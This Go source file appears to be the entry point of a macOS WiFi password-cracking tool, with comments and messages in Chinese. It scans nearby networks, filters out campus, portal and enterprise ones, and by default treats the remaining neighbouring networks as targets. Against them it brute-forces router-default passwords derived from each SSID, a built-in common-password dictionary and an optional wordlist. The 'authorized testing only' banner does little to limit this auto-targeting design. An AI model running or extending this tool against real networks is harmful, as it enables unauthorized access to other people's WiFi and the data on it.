package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"time"
	"wifi-crack/internal/cracker"
	"wifi-crack/internal/dict"
	"wifi-crack/internal/scanner"
)

// ============================================================
// 版本信息
// ============================================================
const (
	version = "1.0.0"
	banner  = `
  ╔══════════════════════════════════════════════╗
  ║     WiFi Cracker v%s (Go + CoreWLAN)      ║
  ║     macOS 专用 · 仅限授权安全测试           ║
  ╚══════════════════════════════════════════════╝
`
)

func main() {
	// ============================================================
	// 命令行参数定义
	// ============================================================
	target := flag.String("t", "", "指定目标SSID（不指定则自动扫描）")
	dictFile := flag.String("d", "", "额外字典文件路径")
	delay := flag.Int("delay", 500, "每次尝试间隔（毫秒）")
	scanOnly := flag.Bool("scan", false, "仅扫描，不爆破")
	verbose := flag.Bool("v", true, "显示详细日志")
	showVersion := flag.Bool("version", false, "显示版本")
	flag.Parse()

	// 版本信息
	if *showVersion {
		fmt.Printf("wifi-crack v%s\n", version)
		return
	}

	fmt.Printf(banner, version)

	// ============================================================
	// 阶段0：位置权限检查
	// ============================================================
	locStatus := scanner.LocationStatus()
	fmt.Printf("  [0/3] 位置权限: %s\n", locStatus)
	if locStatus != "已授权" {
		fmt.Println("  [!] 位置权限未授予，SSID可能不可见")
		fmt.Println("  [!] 请前往: 系统设置 > 隐私与安全 > 定位服务 > 授权终端")
		fmt.Println("  [!] 或运行: sudo /usr/bin/python3 -c \"import CoreLocation\"")
		fmt.Println()
	}

	// ============================================================
	// 阶段1：扫描WiFi
	// ============================================================
	fmt.Println("  [1/3] 扫描附近WiFi网络...")

	nets, err := scanner.ScanWiFi()
	if err != nil {
		fmt.Fprintf(os.Stderr, "  [!] 扫描失败: %v\n", err)
		fmt.Fprintln(os.Stderr, "  [!] 提示: 需要在终端中授予位置权限")
		os.Exit(1)
	}

	if len(nets) == 0 {
		fmt.Fprintln(os.Stderr, "  [!] 未扫描到WiFi网络")
		fmt.Fprintln(os.Stderr, "  [!] 可能原因: 位置权限未授予，请检查 系统设置 > 隐私与安全 > 定位服务")
		os.Exit(1)
	}

	fmt.Printf("  [+] 扫描到 %d 个WiFi网络\n", len(nets))

	// ============================================================
	// 阶段2：过滤目标
	// ============================================================
	fmt.Println("  [2/3] 过滤目标（排除校园网/Portal/企业网/开放网络）...")

	var targets []scanner.WiFiNetwork

	if *target != "" {
		// 指定目标模式：在扫描结果中查找
		for _, n := range nets {
			if n.SSID == *target {
				targets = append(targets, n)
				break
			}
		}
		if len(targets) == 0 {
			fmt.Fprintf(os.Stderr, "  [!] 未找到目标: %s\n", *target)
			os.Exit(1)
		}
	} else {
		// 自动模式：过滤+排序
		targets = scanner.FilterAndSort(nets)
	}

	// 打印目标列表
	fmt.Printf("\n  可爆破目标 (%d 个):\n", len(targets))
	fmt.Println("  ┌────┬──────────────────────────┬────────┬──────────┬─────┐")
	fmt.Println("  │ #  │ SSID                     │ 信号   │ 安全类型 │ 频道│")
	fmt.Println("  ├────┼──────────────────────────┼────────┼──────────┼─────┤")
	for i, n := range targets {
		fmt.Printf("  │ %-2d │ %-24s │ %4d   │ %-8s │ %-3d │\n",
			i+1, truncStr(n.SSID, 24), n.RSSI, n.Security, n.Channel)
	}
	fmt.Println("  └────┴──────────────────────────┴────────┴──────────┴─────┘")

	if len(targets) == 0 {
		fmt.Println("\n  [!] 没有可爆破的目标")
		return
	}

	// 仅扫描模式到此结束
	if *scanOnly {
		fmt.Println("\n  [*] 扫描完成（--scan 模式，不执行爆破）")
		return
	}

	// ============================================================
	// 阶段3：构建密码列表并爆破
	// ============================================================
	fmt.Println("\n  [3/3] 开始爆破...")

	// 构建密码列表：路由器默认密码 + 内置高频字典 + 外部字典
	var allPasswords []string

	// 对每个目标，先放它的路由器默认密码
	// （这里统一用第一个目标的，实际爆破时在CrackOne内可以扩展）
	for _, t := range targets {
		routerDefaults := cracker.GenerateRouterDefaults(t.SSID)
		allPasswords = dict.MergeAndDedup(routerDefaults, allPasswords)
	}

	// 内置高频字典
	allPasswords = dict.MergeAndDedup(allPasswords, dict.TopPasswords)

	// 外部字典文件
	if *dictFile != "" {
		absPath, _ := filepath.Abs(*dictFile)
		extra, err := dict.LoadDictFile(absPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  [!] 字典文件加载失败: %v\n", err)
		} else {
			fmt.Printf("  [+] 外部字典: %s (%d 条)\n", absPath, len(extra))
			allPasswords = dict.MergeAndDedup(allPasswords, extra)
		}
	}

	fmt.Printf("  [+] 密码总量: %d 条\n", len(allPasswords))

	// 爆破配置
	cfg := cracker.CrackConfig{
		Delay:    time.Duration(*delay) * time.Millisecond,
		Verbose:  *verbose,
		MaxRetry: 1,
	}

	// 执行爆破
	results := cracker.CrackAll(targets, allPasswords, cfg)

	// 统计结果
	successCount := 0
	for _, r := range results {
		if r.Success {
			successCount++
		}
	}

	if successCount > 0 {
		os.Exit(0)
	} else {
		os.Exit(1)
	}
}

// ============================================================
// truncStr 截断字符串（超长加省略号）
// ============================================================
func truncStr(s string, maxLen int) string {
	runes := []rune(s)
	if len(runes) <= maxLen {
		return s
	}
	return string(runes[:maxLen-1]) + "…"
}
